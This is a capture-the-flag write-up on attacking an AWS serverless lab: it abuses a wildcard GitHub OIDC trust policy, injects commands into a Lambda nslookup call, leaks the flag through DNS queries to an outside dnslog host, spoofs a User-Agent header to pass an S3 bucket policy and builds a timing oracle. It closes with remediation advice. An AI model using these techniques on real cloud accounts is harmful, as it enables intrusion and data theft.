<div align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=40&pause=1000&color=F71111&center=true&vCenter=true&width=800&height=80&lines=Master+Writeup;Operation+%22Miss+Me+Yet%3F%22" alt="Typing SVG" />
</div>

<div align="center">
  <h3>The Complete Narrative of the Cloud Escape CTF</h3>
  <p><em>Authored by <b>Agent freecandy</b></em></p>
</div>

<hr>

## 🌐 The Target Environment

The target was a modern AWS serverless architecture utilizing API Gateways, Lambda functions, S3 buckets, and CloudFront distributions. The defense strategy relied heavily on **Network Isolation** (VPCs without internet routing) and **Strict IAM Policies** (VPC condition keys and explicit denies).

---

## 🚩 Stage 1: "Have Some Faith"

<details open>
<summary><h3>Step 1: The Foothold (OIDC Exploitation)</h3></summary>

The initial access point was a misconfigured `.git` repository containing Terraform state and IAM policy templates. We discovered that the GitHub Actions OIDC Trust Policy (`cicd-trust-policy.json.tpl`) contained a critical wildcard flaw:

```json
"token.actions.githubusercontent.com:sub": "repo:*/*:ref:refs/heads/corgi"
```

This allowed *any* GitHub repository pushing to a branch named `corgi` to successfully assume the `cicdRole` in the target AWS account (`009661764077`). We created a malicious repository, triggered a workflow, and gained our initial AWS identity.
</details>

<details open>
<summary><h3>Step 2: The Vulnerability (Command Injection)</h3></summary>

Using our assumed role, we enumerated the account and discovered an API Gateway triggering a Lambda function (`nslookupv2`). The Lambda took a `domain` parameter and insecurely executed it via `subprocess.run('/opt/nslookup ' + domain, shell=True)`.

This provided us with Remote Code Execution (RCE).
</details>

<details open>
<summary><h3>Step 3: The Exfiltration (DNS Side-Channel)</h3></summary>

The S3 bucket containing the flag (`codec4f26c862a321ef5`) could only be read from within the VPC. Our Lambda executed inside this VPC, so it could read the flag. However, the VPC had no NAT Gateway (no outbound HTTP/HTTPS) and the Lambda lacked `s3:PutObject` permissions.

**The Bypass:** We abused the default AWS Route 53 VPC Resolver (`169.254.169.253`). While HTTP traffic was dropped, internal DNS queries for external domains are forwarded to the internet by AWS. We hex-encoded the flag and appended it as a subdomain to a controlled DNS server, successfully leaking the data:

```bash
/opt/nslookup 3161316a656c726c6667327969327330.ixz9wv.dnslog.cn
```

> **Stage 1 Flag Captured:** 🟢 `1a1jelrlfg2yi2s0`
</details>

---

## 🚩 Stage 2: "Miss Me Yet?"

<details open>
<summary><h3>Step 1: The Vulnerability (Arbitrary Code Execution)</h3></summary>

Stage 2 introduced a new API endpoint (`/dev/code_exec`) that executed base64-encoded Python payloads via `exec()`. However, the environment was completely blind:
- Standard output (`stdout`) was swallowed.
- Exceptions triggered a generic `{"error":"Something went wrong!"}` response.
- Like Stage 1, there was zero internet egress.
</details>

<details open>
<summary><h3>Step 2: The IAM Bypass (Header Injection)</h3></summary>

We discovered a leaked S3 Bucket Policy via a CloudFront `docs.html` page for bucket `site781fe43f26b9eba3`. The policy allowed `GetObject` access for all files, provided the request originated from the VPC **AND** contained the header `User-Agent: Amazon CloudFront`.

Using our arbitrary Python execution, we injected a `boto3` event hook to spoof this header on all outgoing S3 requests originating from the Lambda:

```python
s3.meta.events.register('before-send.s3.*', lambda request, **kwargs: request.headers.update({'User-Agent': 'Amazon CloudFront'}))
```
</details>

<details open>
<summary><h3>Step 3: The Exfiltration (High-Precision Timing Oracle) - IN PROGRESS</h3></summary>

Because we cannot print the flag or send it outward, we are turning the synchronous nature of the API Gateway against itself by developing a **Blind Timing Oracle**. 

By reading the flag in memory and iterating through its characters, we can instruct the Lambda to `time.sleep(2.0)` if our guessed character is correct. 

```python
if flag[pos] == guess:
    time.sleep(2.0)
```
- **Incorrect Guess:** API responds in ~3-4 seconds.
- **Correct Guess:** API responds in ~9-13 seconds.

*Currently, we have verified the timing discrepancy and are gathering the extraction data. Full flag exfiltration is pending analysis.*

> **Stage 2 Flag Captured:** 🟡 *[IN PROGRESS - ANALYZING ORACLE TIMING DATA]*
</details>

---

## 🛡️ Remediation Summary

1. **OIDC Wildcards:** Never use `repo:*/*` in OIDC trust conditions. Always explicitly define the organization and repository.
2. **Command Injection:** Avoid `shell=True` in Python subprocesses. Pass arguments as lists and validate input rigorously.
3. **Execution Contexts:** Do not expose `eval()` or `exec()` endpoints to untrusted user input.
4. **VPC Isolation:** Relying on VPC isolation is insufficient if DNS resolution (`Route 53 Resolver`) is left active and unmonitored. 
5. **Header-Based Security:** Never use easily spoofed HTTP headers (like `User-Agent`) as a primary security boundary in IAM policies. Rely on `aws:PrincipalArn` or strict VPC Endpoints.

---
<div align="center">
  <i>End of Report — Agent freecandy</i>
</div>
